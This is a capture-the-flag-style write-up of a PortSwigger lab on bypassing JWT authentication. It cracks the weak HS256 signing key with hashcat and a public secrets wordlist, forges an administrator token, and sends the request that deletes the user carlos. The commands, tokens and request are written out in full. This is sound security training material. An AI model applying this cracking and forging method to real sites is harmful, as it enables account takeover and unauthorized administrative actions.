# JWT Authentication Bypass — Weak Signing Key

This lab uses JWTs to manage sessions, signed and verified with an extremely weak secret key — one that's easy to recover by brute-forcing a wordlist of commonly used secrets.

**Goal:** First brute-force the site's secret key. Then use it to sign a modified session token granting access to the admin panel at `/admin`, and delete the user `carlos`.

Login credentials for your own account: wiener:peter

Tip: Getting comfortable with handling JWTs in Burp Suite beforehand is recommended. Using hashcat to brute-force the secret key is also recommended — see PortSwigger's guide on cracking secret keys with hashcat for details.

---

**References:**
- https://portswigger.net/web-security/jwt
- https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list

<img width="767" height="842" alt="1" src="https://github.com/user-attachments/assets/bfa6aff7-60ba-43af-a782-3955dec476df" />


---

Logging in returns a signed JWT:

```
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo
```

<img width="533" height="392" alt="2" src="https://github.com/user-attachments/assets/da647c0e-be13-4fe8-b634-582edff4c90f" />


Attempting to crack it:

```
hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list
```

<img width="749" height="447" alt="3" src="https://github.com/user-attachments/assets/52cefa50-e2bb-4d92-a25d-41a8b84194af" />


The cracked secret turns out to be "secret1":

<img width="627" height="67" alt="4" src="https://github.com/user-attachments/assets/5469101d-b753-44f7-9e68-fb2f8526d3c4" />


Not being too familiar with the JWT extension, I switched over to jwt.io instead:

<img width="989" height="652" alt="5" src="https://github.com/user-attachments/assets/42f34fc8-b5d4-4cc4-a986-899ae14b1b51" />


This produced the following signed JWT:

```
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
```

With it, admin access is granted and the target user can be deleted:

```
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
...
```

<img width="939" height="566" alt="6" src="https://github.com/user-attachments/assets/49b3e65c-f240-4419-b1ac-e6bd37faf966" />

